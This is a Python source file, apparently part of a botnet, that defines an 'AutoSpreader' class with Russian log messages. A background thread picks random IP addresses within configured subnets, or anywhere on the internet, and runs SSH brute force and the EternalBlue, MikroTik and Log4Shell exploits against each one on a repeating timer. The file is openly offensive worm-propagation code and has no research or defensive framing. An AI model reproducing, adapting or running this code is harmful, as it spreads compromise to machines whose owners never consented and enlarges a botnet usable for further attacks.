import asyncio, threading, time, json, os, random
from botnet.spreader import ssh_bruteforce, exploit_eternalblue, exploit_log4shell, exploit_mikrotik, exploit_pwnkit
from utils.logger import log

class AutoSpreader:
    def __init__(self, settings_file="avz_settings.json"):
        self.running = False
        self.thread = None
        self.load_settings(settings_file)

    def load_settings(self, path):
        try:
            with open(path, "r") as f:
                s = json.load(f)
            self.enabled = s.get("auto_spread_enabled", False)
            self.interval = s.get("auto_spread_interval_min", 30) * 60
            self.ranges = s.get("auto_spread_ranges", [])
        except:
            self.enabled = False

    def start(self):
        if self.enabled and not self.running:
            self.running = True
            self.thread = threading.Thread(target=self._worker, daemon=True)
            self.thread.start()
            log("[AutoSpreader] Автозахват запущен")

    def stop(self):
        self.running = False
        log("[AutoSpreader] Автозахват остановлен")

    def _generate_random_ip(self, subnet):
        # Упрощённая генерация случайного IP в подсети (CIDR)
        parts = subnet.split('/')
        ip = parts[0]
        mask = int(parts[1])
        # Простейший случай: /24, /16, /8
        octets = list(map(int, ip.split('.')))
        if mask == 8:
            return f"{octets[0]}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
        elif mask == 16:
            return f"{octets[0]}.{octets[1]}.{random.randint(0,255)}.{random.randint(0,255)}"
        elif mask == 24:
            return f"{octets[0]}.{octets[1]}.{octets[2]}.{random.randint(0,255)}"
        else:
            return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"

    def _worker(self):
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        while self.running:
            for subnet in self.ranges:
                if not self.running:
                    break
                target_ip = self._generate_random_ip(subnet)
                log(f"[AutoSpreader] Сканирую {target_ip}")
                # Пробуем разные эксплойты
                try:
                    # SSH
                    loop.run_until_complete(ssh_bruteforce(target_ip))
                except: pass
                try:
                    exploit_eternalblue(target_ip)
                except: pass
                try:
                    exploit_mikrotik(target_ip)
                except: pass
                try:
                    exploit_log4shell(f"http://{target_ip}")
                except: pass
            time.sleep(self.interval)
